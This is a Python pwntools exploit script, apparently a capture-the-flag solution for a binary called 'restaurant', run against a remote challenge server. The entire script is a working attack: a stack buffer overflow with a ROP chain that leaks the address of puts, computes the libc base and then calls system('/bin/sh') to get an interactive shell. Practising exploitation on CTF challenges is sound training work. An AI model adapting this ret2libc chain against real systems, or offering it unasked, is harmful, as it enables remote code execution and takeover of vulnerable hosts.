#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template restaurant
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('restaurant')
libc = ELF('libc.so.6')
context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00400ee5
continue
'''.format(**locals())

#io = start()
io= remote("138.68.178.56",30118)
def setup():
    io.sendlineafter(b'> ',b"1")
    #io.sendline(b"1")
    io.recvuntil(b'> ')

setup()
offset=40
PUTS_PLT = exe.plt['puts']
PUTS_GOT = exe.got['puts']
#0x00000000004010a3: pop rdi; ret;
pop_rdi = 0x00000000004010a3
main = exe.symbols['main']
payload = b'A'*offset +p64(pop_rdi)+p64(PUTS_GOT)+p64(PUTS_PLT) + p64(main)

io.sendline(payload)
leak=io.recvline_startswith(b'Enjoy your')
leak = u64(leak[-6:].ljust(8, b"\x00"))
log.info(f"puts found at {hex(leak)}")
libc.address = leak - libc.symbols['puts']
log.info(f"libc address at {hex(libc.address)}")
setup()
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
#0x000000000040063e: ret; 
ret=0x000000000040063e
payload =b'A'*offset + p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
io.sendline(payload)

io.interactive()
